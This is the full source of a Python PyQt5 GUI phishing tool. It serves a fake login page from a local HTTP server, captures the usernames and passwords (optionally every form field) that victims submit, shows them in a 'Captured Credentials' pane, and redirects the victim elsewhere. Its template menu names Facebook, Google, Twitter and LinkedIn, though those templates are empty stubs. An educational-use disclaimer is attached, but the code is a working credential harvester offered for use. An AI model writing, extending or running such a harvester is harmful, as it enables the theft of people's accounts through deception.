import os
import sys
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
import urllib.parse
import webbrowser
from datetime import datetime
import json
import random
import string
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QTextEdit, QPushButton, QTabWidget,
                             QComboBox, QCheckBox, QGroupBox, QSpinBox, QFileDialog,
                             QMessageBox, QPlainTextEdit, QSplitter)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor, QPalette

class PhishingServer(QThread):
    new_credentials = pyqtSignal(str)
    server_status = pyqtSignal(str)

    def __init__(self, port, template, redirect_url, capture_all):
        super().__init__()
        self.port = port
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.running = False
        self.server = None

    def run(self):
        handler = lambda *args: PhishingRequestHandler(*args, 
                                                     template=self.template,
                                                     redirect_url=self.redirect_url,
                                                     capture_all=self.capture_all,
                                                     callback=self.handle_credentials)
        
        class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
            pass
        
        self.server = ThreadedHTTPServer(('localhost', self.port), handler)
        self.running = True
        self.server_status.emit(f"Server running on http://localhost:{self.port}")
        
        try:
            self.server.serve_forever()
        except Exception as e:
            self.server_status.emit(f"Server error: {str(e)}")
        finally:
            self.running = False

    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.server_status.emit("Server stopped")
        self.running = False

    def handle_credentials(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] Captured credentials:\n{data}\n"
        self.new_credentials.emit(log_entry)

class PhishingRequestHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, template, redirect_url, capture_all, callback):
        self.template = template
        self.redirect_url = redirect_url
        self.capture_all = capture_all
        self.callback = callback
        super().__init__(*args)

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.template.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse the POST data
        parsed_data = urllib.parse.parse_qs(post_data)
        cleaned_data = {k: v[0] for k, v in parsed_data.items()}
        
        # Log all data if capture_all is True, otherwise just username/password
        if self.capture_all:
            captured_data = cleaned_data
        else:
            captured_data = {
                'username': cleaned_data.get('username', ''),
                'password': cleaned_data.get('password', '')
            }
        
        # Send the data to the callback
        self.callback(json.dumps(captured_data, indent=2))
        
        # Redirect the user
        self.send_response(302)
        self.send_header('Location', self.redirect_url)
        self.end_headers()

class PhishingTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Accurate Cyber Defense Phishing Tool (Educational Use Only)")
        self.setGeometry(100, 100, 1000, 700)
        
        # Set blue theme
        self.set_blue_theme()
        
        # Server variables
        self.phishing_server = None
        self.current_port = 8080
        
        # Initialize UI
        self.init_ui()
        
        # Load default template
        self.load_default_template()
    
    def set_blue_theme(self):
        palette = self.palette()
        palette.setColor(QPalette.Window, QColor(240, 245, 255))
        palette.setColor(QPalette.WindowText, QColor(0, 51, 102))
        palette.setColor(QPalette.Base, QColor(255, 255, 255))
        palette.setColor(QPalette.AlternateBase, QColor(230, 240, 255))
        palette.setColor(QPalette.ToolTipBase, QColor(0, 51, 102))
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, QColor(0, 51, 102))
        palette.setColor(QPalette.Button, QColor(200, 220, 255))
        palette.setColor(QPalette.ButtonText, QColor(0, 51, 102))
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Highlight, QColor(0, 102, 204))
        palette.setColor(QPalette.HighlightedText, Qt.white)
        self.setPalette(palette)
        
        self.setStyleSheet("""
            QGroupBox {
                border: 1px solid #99B4D1;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 3px;
            }
            QTabWidget::pane {
                border: 1px solid #99B4D1;
                top: -1px;
            }
            QTabBar::tab {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                        stop: 0 #E1E1E1, stop: 0.4 #DDDDDD,
                                        stop: 0.5 #D8D8D8, stop: 1.0 #D3D3D3);
                border: 1px solid #99B4D1;
                border-bottom-color: #C2C7CB;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
                min-width: 8ex;
                padding: 4px;
            }
            QTabBar::tab:selected {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                        stop: 0 #B8D0FF, stop: 0.4 #A0C0FF,
                                        stop: 0.5 #90B8FF, stop: 1.0 #80B0FF);
            }
            QTextEdit, QPlainTextEdit {
                border: 1px solid #99B4D1;
                border-radius: 3px;
            }
        """)
    
    def init_ui(self):
        # Main layout
        main_widget = QWidget()
        main_layout = QHBoxLayout()
        main_widget.setLayout(main_layout)
        self.setCentralWidget(main_widget)
        
        # Splitter for left and right panels
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel (configuration)
        left_panel = QWidget()
        left_layout = QVBoxLayout()
        left_panel.setLayout(left_layout)
        splitter.addWidget(left_panel)
        
        # Right panel (terminal/output)
        right_panel = QWidget()
        right_layout = QVBoxLayout()
        right_panel.setLayout(right_layout)
        splitter.addWidget(right_panel)
        
        # Tab widget for left panel
        tab_widget = QTabWidget()
        left_layout.addWidget(tab_widget)
        
        # Server Configuration Tab
        server_tab = QWidget()
        server_layout = QVBoxLayout()
        server_tab.setLayout(server_layout)
        tab_widget.addTab(server_tab, "Server Config")
        
        # Port configuration
        port_group = QGroupBox("Server Settings")
        port_layout = QVBoxLayout()
        port_group.setLayout(port_layout)
        server_layout.addWidget(port_group)
        
        port_row = QHBoxLayout()
        port_row.addWidget(QLabel("Port:"))
        self.port_input = QSpinBox()
        self.port_input.setRange(1024, 65535)
        self.port_input.setValue(8080)
        port_row.addWidget(self.port_input)
        port_layout.addLayout(port_row)
        
        # Redirect URL
        redirect_row = QHBoxLayout()
        redirect_row.addWidget(QLabel("Redirect URL:"))
        self.redirect_input = QLineEdit("https://example.com")
        redirect_row.addWidget(self.redirect_input)
        port_layout.addLayout(redirect_row)
        
        # Capture options
        self.capture_all_check = QCheckBox("Capture all form fields (not just username/password)")
        port_layout.addWidget(self.capture_all_check)
        
        # Server controls
        server_controls = QHBoxLayout()
        self.start_button = QPushButton("Start Server")
        self.start_button.clicked.connect(self.start_server)
        server_controls.addWidget(self.start_button)
        
        self.stop_button = QPushButton("Stop Server")
        self.stop_button.clicked.connect(self.stop_server)
        self.stop_button.setEnabled(False)
        server_controls.addWidget(self.stop_button)
        
        port_layout.addLayout(server_controls)
        
        # Template Editor Tab
        template_tab = QWidget()
        template_layout = QVBoxLayout()
        template_tab.setLayout(template_layout)
        tab_widget.addTab(template_tab, "Template Editor")
        
        # Template selection
        template_select_row = QHBoxLayout()
        template_select_row.addWidget(QLabel("Template:"))
        self.template_select = QComboBox()
        self.template_select.addItems(["Facebook", "Google", "Twitter", "LinkedIn", "Custom"])
        self.template_select.currentTextChanged.connect(self.change_template)
        template_select_row.addWidget(self.template_select)
        
        self.load_template_btn = QPushButton("Load from File")
        self.load_template_btn.clicked.connect(self.load_template_from_file)
        template_select_row.addWidget(self.load_template_btn)
        
        self.save_template_btn = QPushButton("Save to File")
        self.save_template_btn.clicked.connect(self.save_template_to_file)
        template_select_row.addWidget(self.save_template_btn)
        
        template_layout.addLayout(template_select_row)
        
        # Template editor
        self.template_editor = QTextEdit()
        template_layout.addWidget(self.template_editor)
        
        # Right panel - Terminal/Output
        output_group = QGroupBox("Server Log")
        output_layout = QVBoxLayout()
        output_group.setLayout(output_layout)
        right_layout.addWidget(output_group)
        
        self.terminal_output = QPlainTextEdit()
        self.terminal_output.setReadOnly(True)
        self.terminal_output.setFont(QFont("Courier New", 10))
        output_layout.addWidget(self.terminal_output)
        
        # Credentials display
        creds_group = QGroupBox("Captured Credentials")
        creds_layout = QVBoxLayout()
        creds_group.setLayout(creds_layout)
        right_layout.addWidget(creds_group)
        
        self.creds_display = QPlainTextEdit()
        self.creds_display.setReadOnly(True)
        self.creds_display.setFont(QFont("Courier New", 10))
        creds_layout.addWidget(self.creds_display)
        
        # Clear buttons
        clear_buttons = QHBoxLayout()
        clear_log_btn = QPushButton("Clear Log")
        clear_log_btn.clicked.connect(lambda: self.terminal_output.clear())
        clear_buttons.addWidget(clear_log_btn)
        
        clear_creds_btn = QPushButton("Clear Credentials")
        clear_creds_btn.clicked.connect(lambda: self.creds_display.clear())
        clear_buttons.addWidget(clear_creds_btn)
        
        right_layout.addLayout(clear_buttons)
    
    def load_default_template(self):
        default_template = """<!DOCTYPE html>
<html>
<head>
    <title>Login Page</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; }
        .login-box { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; color: #333; }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>"""
        self.template_editor.setPlainText(default_template)
    
    def change_template(self, template_name):
        if template_name == "Custom":
            return
        
        templates = {
            "Facebook": """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        /* Facebook-like styling */
    </style>
</head>
<body>
    <!-- Facebook-like login form -->
</body>
</html>""",
            "Google": """<!DOCTYPE html>
<html>
<head>
    <title>Google</title>
    <style>
        /* Google-like styling */
    </style>
</head>
<body>
    <!-- Google-like login form -->
</body>
</html>""",
            "Twitter": """<!DOCTYPE html>
<html>
<head>
    <title>Twitter / Login</title>
    <style>
        /* Twitter-like styling */
    </style>
</head>
<body>
    <!-- Twitter-like login form -->
</body>
</html>""",
            "LinkedIn": """<!DOCTYPE html>
<html>
<head>
    <title>LinkedIn Login</title>
    <style>
        /* LinkedIn-like styling */
    </style>
</head>
<body>
    <!-- LinkedIn-like login form -->
</body>
</html>"""
        }
        
        if template_name in templates:
            self.template_editor.setPlainText(templates[template_name])
    
    def load_template_from_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Open Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    self.template_editor.setPlainText(file.read())
                self.template_select.setCurrentText("Custom")
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not open file: {str(e)}")
    
    def save_template_to_file(self):
        file_path, _ = QFileDialog.getSaveFileName(self, "Save Template File", "", "HTML Files (*.html *.htm);;All Files (*)")
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(self.template_editor.toPlainText())
            except Exception as e:
                QMessageBox.warning(self, "Error", f"Could not save file: {str(e)}")
    
    def start_server(self):
        port = self.port_input.value()
        template = self.template_editor.toPlainText()
        redirect_url = self.redirect_input.text()
        capture_all = self.capture_all_check.isChecked()
        
        if not template:
            QMessageBox.warning(self, "Error", "Template cannot be empty")
            return
        
        try:
            # Stop existing server if running
            if self.phishing_server and self.phishing_server.running:
                self.phishing_server.stop()
                self.phishing_server.wait()
            
            # Start new server
            self.phishing_server = PhishingServer(port, template, redirect_url, capture_all)
            self.phishing_server.new_credentials.connect(self.handle_new_credentials)
            self.phishing_server.server_status.connect(self.handle_server_status)
            self.phishing_server.start()
            
            self.start_button.setEnabled(False)
            self.stop_button.setEnabled(True)
            
            # Generate phishing link
            phishing_link = f"http://localhost:{port}"
            self.terminal_output.appendPlainText(f"Phishing link generated: {phishing_link}")
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Could not start server: {str(e)}")
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.stop()
            self.phishing_server.wait()
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
    
    def handle_new_credentials(self, data):
        self.creds_display.appendPlainText(data)
        self.terminal_output.appendPlainText("New credentials captured!")
    
    def handle_server_status(self, status):
        self.terminal_output.appendPlainText(status)
    
    def closeEvent(self, event):
        if self.phishing_server and self.phishing_server.running:
            self.stop_server()
            self.phishing_server.wait()
        event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    # Create and show main window
    window = PhishingTool()
    window.show()
    
    # Display disclaimer
    QMessageBox.information(window, "Disclaimer", 
        "This tool is for educational and penetration testing purposes only.\n\n"
        "Unauthorized phishing attempts are illegal. Always obtain proper consent before testing security systems.")
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()